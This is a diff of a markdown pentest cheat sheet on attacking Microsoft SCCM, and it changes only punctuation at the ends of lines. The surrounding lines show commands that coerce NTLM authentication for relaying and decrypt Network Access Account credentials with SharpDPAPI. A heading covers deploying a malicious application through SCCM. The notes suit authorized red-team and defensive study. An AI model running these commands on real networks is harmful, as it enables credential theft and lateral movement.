@@ -1,7 +1,7 @@
 ### Sources
-https://github.com/Mayyhem/SharpSCCM 
-https://github.com/PowerShellMafia/PowerSCCM - a bit outdated but still valid
-https://github.com/nettitude/MalSCCM 
+https://github.com/Mayyhem/SharpSCCM, 
+https://github.com/PowerShellMafia/PowerSCCM - a bit outdated but still valid,
+https://github.com/nettitude/MalSCCM,
 https://github.com/GhostPack/SharpDPAPI 
 
 ### Identify SCCM server on local machine
@@ -27,7 +27,7 @@ MalSCCM.exe inspect /all /server:<PrimarySiteFQDN>
 ```
 SharpSCCM.exe <server> <sitecode> invoke client-push -t "<windows_host_netbios_name>@445"
 ```
-Details on relaying setup - https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a 
+Details on relaying setup - https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a, 
 Additional relaying hints - https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867 
 
 ### Deploy malicous application by SCCM - ATTENTION - permissions within SCCM Infrastructure required - potential impact on target infrastructure
@@ -67,5 +67,5 @@ In case an NAA Account has been deployed or used it can be decrypted on the loca
 SharpDPAPI.exe sccm
 ```
 
-ATTENTION - local admin privileges are required.
+ATTENTION - local admin privileges are required -
 https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9
